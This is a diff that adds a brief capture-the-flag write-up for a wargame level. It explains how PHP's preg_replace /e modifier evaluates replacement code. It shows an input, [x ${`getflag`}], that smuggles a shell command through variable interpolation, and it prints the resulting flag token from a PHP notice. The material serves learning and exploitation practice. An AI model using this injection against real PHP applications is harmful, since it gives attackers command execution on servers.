@@ -1,1 +1,22 @@
-y"\2"
+regexp in php:
+
+(\[x (.*)\])/e => y(\"\\2\")
+
+
+Regexp left operand:
+
+	first group: \1 = whole expression => [x .*]
+	second group: \2 = anything inside parenthesis: (.*)
+
+Regexp right operand:
+
+	result of the execution of y(second_group)
+
+
+[x ${`getflag`}]
+
+executes => y(${`getflag`})
+executes => y(${Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub}) => error undefined variable
+
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+ in /home/user/level06/level06.php(4) : regexp code on line 1
